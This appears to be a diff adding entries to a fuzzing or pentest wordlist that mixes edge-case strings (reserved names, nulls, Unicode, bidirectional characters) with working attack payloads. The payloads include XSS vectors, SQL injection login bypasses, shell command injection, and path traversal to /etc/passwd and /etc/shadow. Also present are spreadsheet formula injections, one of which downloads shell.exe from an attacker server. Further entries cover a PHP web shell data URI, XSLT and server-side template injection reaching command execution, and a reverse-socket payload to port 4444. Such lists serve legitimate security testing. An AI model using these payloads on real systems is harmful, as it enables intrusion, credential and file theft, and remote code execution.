+<svg><animatetransform%20§§=1>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)' /></svg>#x" />
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+<test></test>
+<use id=x />
+<x data-slide-to="0" data-target="<img src=x onerror=alert(3)>">XSS</x>
+<x data-spy="affix" data-target="<img src=x onerror=alert(1)>">
+<x data-spy="scroll" data-target="<img src=x onerror=alert(1) />">XSS</x>
+<x data-toggle="collapse" data-target="<img src=x onerror=alert(1)>">XSS</x>
+<x data-toggle="modal" data-target="<img src=x onerror=alert(2)>">XSS</x>
+<x data-toggle="tooltip" data-container="<img src=x onerror=alert(1) />" title="x">XSS</x>
+<x data-toggle="tooltip" data-viewport="<img src=x onerror=alert(1) />">XSS</x>
+<x href="<img src=x onerror=alert(0)>" data-dismiss="alert">XSS</x>
+<x v-if=_c.constructor('alert(1)')()>
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml SRC="xsstest.xml" ID=I></xml>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';//dom 
+<xss id=x style="transition:color 1s" ontransitionend=alert(1)></xss>
+<xss style="display:block;transition:outline 1s;" ontransitionend=alert(1) id=x tabindex=1>test</xss>
+<xss><script>alert('XSS')</script></vulnerable>
+=
+= '
+= --
+= ;
+=10+20+cmd|' /C calc'!A0
+=BYPASS%00")});alert(1);$(document).ready(function%20(){%2f%2f
+=cmd|' /C notepad'!'A1'
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+>
+?
+?x=
+?x="
+?x=>
+?x=|
+@
+@&apos;
+@'
+@(6+5)
+@*
+@SUM(1+9)*cmd|' /C calc'!A0
+@variable
+@{[system "touch /tmp/blns.fail"]}
+[
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+[&apos;]
+[']
+[].map.call`${eval}\\u{61}lert\x281337\x29`
+[].sort.call`${alert}1337`
+[url=javascript:alert(1)]Click me![/url]
+[video]javascript:alert(1)[/video]
+\
+\"-alert(1)}//
+\";alert('XSS');//
+\"blah
+\&apos;
+\'
+\');confirm(1);//
+\';alert(1)//
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\etc\passwd
+\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
+\..\..\..\..\..\..\..\..\..\..\etc\shadow
+\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
+\0
+\00
+\00\00
+\00\00\00
+\0\0
+\0\0\0
+\\
+\\&apos;/bin/cat%20/etc/passwd\\&apos;
+\\&apos;/bin/cat%20/etc/shadow\\&apos;
+\\/
+\\\\*
+\\\\?\\
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id\n
+\n/usr/bin/id|
+\nid;
+\nid\n
+\nid|
+\nnetstat -a%\n
+\t
+\u003c
+\u003C
+\x23
+\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x27UNION SELECT
+\x3c
+\x3C
+\x3D \x27
+\x3D \x3B'
+]
+^
+^&apos;
+^'
+_
+`
+` 
+`/usr/bin/id`
+`dir`
+`id`
+`ls -al /`
+`ping 127.0.0.1`
+`touch /tmp/blns.fail`
+A
+a" or 1=1--
+a' waitfor delay '0:0:10'--
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+A:
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
+a;id;
+a;id\n
+a;id|
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' or '
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'--
+admin'/*
+admin'or 1=1 or ''='
+AND 10183=10183 AND ('1433=1433
+as
+asc
+AUX
+a|/usr/bin/id
+a|id
+a|id|
+bfilename
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:\boot.ini
+C:\inetpub\wwwroot\global.asa
+char%4039%41%2b%40SELECT
+CLOCK$
+COM1
+COM2
+COM3
+COM4
+CON
+count(/child::node())
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+DCC SEND STARTKEYLOGGER 0 0 0
+DDE ("cmd";"/C calc";"!A0")A0
+declare @s varchar(200) select @s = 0x77616974 ...
+delete
+desc
+distinct
+document.body.innerHTML="\u003cimg src=x onerror=alert\u002823\u0029\u003e";
+etc/passwd%00
+eval("puts 'hello world'")
+exec sp
+exec xp
+false
+False
+FALSE
+File:///
+hacker"; alert('xss'); var $a= "
+handler
+hasOwnProperty
+having
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+http:%252f%252fevil.com%252fshell.txt
+http://evil.com/shell.txt%00
+http://scumdestroy.com?&apos;-alert(414)-&apos;
+id%00
+id%00|
+INF
+inf
+Infinity
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
+insert
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascripT://https://google.com%0aalert(1);//https://google.com
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://scumdestroy.xss.ht\';document.body.appendChild(a)')
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+like
+limit
+LPT1
+LPT2
+LPT3
+NaN
+nil
+NIL
+None
+NUL
+null
+NULL
+oklol'
+or
+or 0=0 #
+or 0=0 --
+or 1=1
+or 1=1#
+or 1=1--
+or 1=1/*
+or a=a
+or%201=1
+or%201=1 --
+order by
+page=php:expect://id
+page=php:expect://ls
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗
+PRINT
+PRINT @@variable
+PRN
+procedure
+replace
+root" #
+root" --
+root" or "1"="1
+root" or "1"="1"#
+select
+something%00html
+sqlvuln
+str0d"/><style>@Keyframe Sx{}</style><str style="animation-name:x;" onanimationend="alert.bind()(22)"></str>
+System("ls -al /")
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+test⁠test‫
+The quick brown fox... [Beeeep]
+thnxtho"
+to_timestamp_tz
+true
+True
+TRUE
+truncate
+tz_offset
+undef
+undefined
+update
+x");$=alert, $(1);//
+x' AND email IS NULL; --
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
+ZZ:
+{
+{$smarty.version}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+{&apos;}
+{'}
+{0}
+{1} + {1}
+{php}echo `id`;{/php}
+{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ [].class.base.subclasses() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("C:\boot.ini") }}
+{{ request }}
+{{$on.constructor('alert(1)')()}}
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.class.mro()[1].subclasses()}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+{{'a'.toUpperCase()}} 
+{{2*2}}[[3*3]]
+{{3*'3'}}
+{{3*3}}
+{{4+4}}
+{{4+8}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['id']|filter('system')}}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}`
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{{app.request.server.all|join(',')}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{config.items()}}
+{{dump(app)}}
+{{person.name}}
+{{person.secret}}
+{{request.__class__}}
+{{request|attr("__class__")}}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{self}}
+|
+| 
+| id
+| whoami
+|/bin/ls -al
+|/usr/bin/id
+|/usr/bin/id|
+|dir
+|dir|
+|id
+|id;
+|id|
+|ls
+|ls -la
+|nid\n
+|usr/bin/id\n
+||
+|| 
+||/usr/bin/id;
+||/usr/bin/id|
+||6
+}
+~
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿
+â or 3=3 --
+בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
+הָיְתָהtestالصفحات التّحول
+ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.
+مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،
+١٢٣✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿
+జ్ఞ‌ా
+ test 
+‪‪test‪
+‫test‫
+⁦test⁧
+ﷺ
+﷽
+１２３
+🏳0🌈️
+🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧
